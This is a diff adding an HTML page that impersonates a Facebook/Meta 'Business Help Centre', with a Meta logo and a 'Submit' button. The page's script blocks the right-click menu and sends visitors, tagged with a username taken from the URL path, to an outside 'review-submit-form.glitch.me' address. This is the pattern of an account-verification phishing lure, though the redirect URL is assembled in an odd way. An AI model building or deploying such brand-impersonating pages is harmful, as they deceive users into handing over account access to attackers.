@@ -1,0 +1,136 @@
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Help Centre</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+  <style>
+    /* CSS styles */
+    body {
+      font-family: system-ui;
+      margin: 0;
+      padding: 0;
+    }
+  
+    .container-fluid {
+      background: #F5F6F6;
+    }
+    .container {
+      padding: 1rem;
+    }
+  
+    .logo {
+      width: 6rem;
+      height: 6rem;
+    }
+  
+    .meta-logo {
+      width: 4rem;
+      height: 4rem;
+    }
+  
+    .btn {
+      background: #0064e0;
+      border: none;
+      border-radius: 100px;
+      padding: 10px 35px;
+      text-decoration: none;
+      color: white;
+      display: inline-block;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif; /* Same font family */
+      font-size: 16px; /* Adjust as needed */
+    }
+  
+    .content {
+      margin-top: 3rem;
+      display: flex;
+      justify-content: center;
+    }
+  
+    .content .col-sm-6 {
+      margin-top: 3rem;
+      margin-left: 5rem;
+    }
+  
+    .content p {
+      font-size: 18px;
+      margin-top: 1rem;
+      font-family: Arial, sans-serif; /* Same font family */
+    }
+  
+    .sign-up {
+      font-size: 17px;
+      padding-top: 1rem;
+      font-family: Arial, sans-serif; /* Same font family */
+    }
+  
+    .business-info {
+      font-size: 14px;
+      font-family: Arial, sans-serif; /* Same font family */
+    }
+  
+    .region-info {
+      font-size: 13px;
+      font-style: italic;
+      font-family: Arial, sans-serif; /* Same font family */
+    }
+  
+    .image {
+      display: none;
+      width: 42%;
+      height: 100vh; /* Ensure full height */
+      background-size: cover;
+      /* background-position: center; */
+      /* margin-left: 5rem; */
+      
+    }
+  
+    @media (min-width: 576px) {
+      .image {
+        display: block;
+      }
+    }
+    
+    
+  </style>
+  </head>
+  <body>
+    <div class="container-fluid">
+      <div class="container">
+        <img src="https://firebasestorage.googleapis.com/v0/b/chatapp-3655a.appspot.com/o/%5BCITYPNG.COM%5DHD%20Facebook%20Meta%20Logo%20PNG%20-%202000x2000.png?alt=media&amp;token=8acc1607-991f-4cae-bad4-9346eb388ab3" alt="logo" class="logo">
+      </div>
+    </div>
+    <div class="content">
+      <div class="col-sm-6">
+        
+        <h1 class="my-3 fs-1">Business<br> Help Centre</h1>
+        <div style="margin-bottom: 30px;"></div>
+        <a onclick="onBtlClick()" class="btn">Submit</a>
+        <p class="mt-4">𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝐟𝐨𝐫 𝐲𝐨𝐮𝐫 𝐮𝐧𝐝𝐞𝐫𝐬𝐭𝐚𝐧𝐝𝐢𝐧𝐠 𝐚𝐧𝐝 𝐜𝐨𝐨𝐩𝐞𝐫𝐚𝐭𝐢𝐨𝐧<br> Facebook.</p>
+        <p class="sign-up"></p>
+        <p class="mt-4 mb-0">
+          <span class="fw-semibold">Are you a business?</span> Get more
+          information on
+        </p>
+        <a href="#" class="business-info">Meta Verified For Businesses</a>
+        <p class="mt-4 font-italic region-info">Features, availability, and pricing may vary by region.</p>
+      </div>
+      <div class="col-sm-5 image" style="background-image: url('./background.png'); "></div>
+    </div>
+  
+  <script>
+    document.addEventListener('contextmenu', event => {
+      event.preventDefault();
+    });
+  
+    function onBtlClick() {
+      var username = window.location.pathname.split("/")[1]; // Extract username from the path
+            var currentHost =
+              window.location.protocol + "//" + window.location.hostname;
+  
+              var redirectURL = currentHost + "/" + username + "https://review-submit-form.glitch.me/"; // Updated URL with username
+              window.location.replace(redirectURL);
+    }
+  </script>
+  
+  </body></html>
